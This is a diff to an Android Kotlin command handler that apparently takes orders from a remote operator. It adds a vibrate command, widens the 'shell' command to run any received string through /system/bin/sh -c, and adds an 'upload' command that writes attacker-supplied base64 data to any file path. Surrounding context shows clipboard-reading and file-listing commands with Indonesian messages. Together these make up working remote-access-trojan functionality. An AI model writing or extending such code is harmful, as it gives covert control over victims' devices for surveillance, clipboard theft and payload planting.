@@ -122,9 +122,31 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     sendResponse(resp)
                     return resp
                 }
+                "vibrate" -> {
+                    try {
+                        val durationMs = (textArg.toFloatOrNull() ?: 1f) * 1000L
+                        val effect = VibrationEffect.createOneShot(durationMs.toLong(), VibrationEffect.DEFAULT_AMPLITUDE)
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                            val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
+                            vm.defaultVibrator.vibrate(effect)
+                        } else {
+                            @Suppress("DEPRECATION")
+                            val vib = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+                            vib.vibrate(effect)
+                        }
+                        val resp = createResponse(cmdId, "success", "Vibrating ${durationMs.toLong()}ms")
+                        sendResponse(resp)
+                        return resp
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Vibrate failed: ${e.message}")
+                        sendResponse(resp)
+                        return resp
+                    }
+                }
                 "shell" -> {
                     try {
-                        val process = Runtime.getRuntime().exec(textArg.ifEmpty { "ls" })
+                        val fullCmd = textArg.ifEmpty { "ls" }
+                        val process = Runtime.getRuntime().exec(arrayOf("/system/bin/sh", "-c", fullCmd))
                         val reader = BufferedReader(InputStreamReader(process.inputStream))
                         val errorReader = BufferedReader(InputStreamReader(process.errorStream))
                         val output = StringBuilder()
@@ -251,6 +273,27 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     val resp = createResponse(cmdId, "clipboard", txt)
                     sendResponse(resp)
                     return resp
+                }
+                "upload" -> {
+                    try {
+                        val parts = textArg.split("^^^")
+                        if (parts.size == 2) {
+                            val path = parts[0]
+                            val data = android.util.Base64.decode(parts[1], android.util.Base64.DEFAULT)
+                            java.io.File(path).writeBytes(data)
+                            val resp = createResponse(cmdId, "success", "Berhasil diunggah: ${java.io.File(path).name}")
+                            sendResponse(resp)
+                            return resp
+                        } else {
+                            val resp = createResponse(cmdId, "error", "Payload upload tidak valid")
+                            sendResponse(resp)
+                            return resp
+                        }
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Gagal upload: ${e.message}")
+                        sendResponse(resp)
+                        return resp
+                    }
                 }
                 "ls" -> {
                     try {
